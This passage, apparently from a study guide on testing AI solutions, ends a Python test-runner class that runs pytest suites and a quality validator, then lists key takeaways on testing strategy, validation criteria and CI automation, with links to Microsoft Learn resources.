        self.run_performance_tests()
        
        # Generate report
        self.generate_report()
        
        return self.results
    
    def run_unit_tests(self):
        """Run unit test suite"""
        result = pytest.main([
            "tests/unit",
            "--junitxml=test-results/unit-tests.xml",
            "-v"
        ])
        
        self.update_results("unit", result)
    
    def run_integration_tests(self):
        """Run integration test suite"""
        result = pytest.main([
            "tests/integration",
            "--junitxml=test-results/integration-tests.xml",
            "-v"
        ])
        
        self.update_results("integration", result)
    
    def run_quality_validation(self):
        """Run AI quality validation"""
        from scripts.validate_quality import QualityValidator
        
        validator = QualityValidator(
            test_dataset="test_data/golden_dataset.json",
            threshold=self.config["quality_threshold"]
        )
        
        passed = validator.validate()
        
        if not passed:
            self.results["failed"] += 1
            self.results["failures"].append({
                "suite": "quality_validation",
                "reason": "Quality metrics below threshold"
            })
        else:
            self.results["passed"] += 1
    
    def run_performance_tests(self):
        """Run performance test suite"""
        result = pytest.main([
            "tests/performance",
            "--junitxml=test-results/performance-tests.xml",
            "-v"
        ])
        
        self.update_results("performance", result)
    
    def update_results(self, suite_name, result_code):
        """Update test results based on pytest result code"""
        if result_code == 0:
            self.results["passed"] += 1
        else:
            self.results["failed"] += 1
            self.results["failures"].append({
                "suite": suite_name,
                "result_code": result_code
            })
    
    def generate_report(self):
        """Generate test summary report"""
        total = self.results["passed"] + self.results["failed"] + self.results["skipped"]
        
        print("\n" + "="*60)
        print("TEST EXECUTION SUMMARY")
        print("="*60)
        print(f"Total Tests: {total}")
        print(f"Passed: {self.results['passed']} ({self.results['passed']/total*100:.1f}%)")
        print(f"Failed: {self.results['failed']} ({self.results['failed']/total*100:.1f}%)")
        print(f"Skipped: {self.results['skipped']}")
        
        if self.results["failures"]:
            print("\nFailed Test Suites:")
            for failure in self.results["failures"]:
                print(f"  - {failure['suite']}: {failure.get('reason', 'See logs for details')}")
        
        # Save results
        with open("test-results/summary.json", "w") as f:
            json.dump(self.results, f, indent=2)

if __name__ == "__main__":
    runner = AITestRunner()
    results = runner.run_all_tests()
    
    # Exit with error code if tests failed
    exit(0 if results["failed"] == 0 else 1)
```

---

## Key Takeaways

✅ **Comprehensive Testing Strategy:**
- Test at multiple levels: unit, integration, end-to-end, performance
- Validate both functional and non-functional requirements
- Include quality metrics (groundedness, relevance, safety)

✅ **Test Case Design:**
- Create diverse test datasets covering edge cases
- Use conversation flow test cases for bot testing
- Maintain regression test suite for previously identified bugs
- Version test data alongside code

✅ **Validation Criteria:**
- Groundedness (response supported by sources)
- Relevance (response addresses query)
- Safety (no harmful content)
- Performance (latency, throughput, error rate)
- Security (authentication, authorization, PII protection)

✅ **Automation:**
- Integrate tests into CI/CD pipeline
- Automate quality validation with judge models
- Run tests on every commit and before deployment
- Generate automated test reports

✅ **Continuous Testing:**
- Monitor production quality continuously
- Sample live conversations for quality evaluation
- Maintain golden dataset for benchmarking
- Update tests as system evolves

---

## Study Resources

- [Azure AI Foundry Evaluation](https://learn.microsoft.com/en-us/azure/ai-studio/how-to/evaluate-generative-ai-app)
- [Copilot Studio Testing](https://learn.microsoft.com/en-us/microsoft-copilot-studio/authoring-test-bot)
- [Azure DevOps for AI](https://learn.microsoft.com/en-us/azure/devops/)
- [Responsible AI Testing](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/safety-system-message)

**Previous Topic:** [Monitor and Tune AI Solutions](01-monitor-tune.md)  
**Next Topic:** [Application Lifecycle Management](03-alm.md)
